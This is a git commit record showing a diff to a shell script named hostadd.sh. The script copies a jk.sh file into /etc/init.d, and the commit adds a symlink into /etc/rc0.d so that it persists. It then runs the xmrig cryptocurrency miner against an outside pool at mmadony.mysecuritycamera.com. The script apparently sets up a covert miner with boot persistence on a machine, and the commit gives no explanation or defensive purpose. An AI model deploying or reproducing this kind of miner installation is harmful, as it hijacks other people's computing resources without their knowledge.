cd1895461fca3a89ca99d947cd9527364f7ff6dd
DevLock <Ferchulin6489@Github.com>
2018-01-02 12:01:47 +0100

    d

--- hostadd.sh
+++ hostadd.sh
@@ -10,4 +10,6 @@ sudo cp /root/Strangers/jk.sh /etc/init.d/
 
 sudo chmod +x /etc/init.d/jk.sh
 
+sudo ln -s /etc/init.d/jk.sh /etc/rc0.d/S98mi_script
+
 sudo /root/xmrig-2.4.3/xmrig -o mmadony.mysecuritycamera.com:7666 -u Co -p 1 --cpu-priority 2
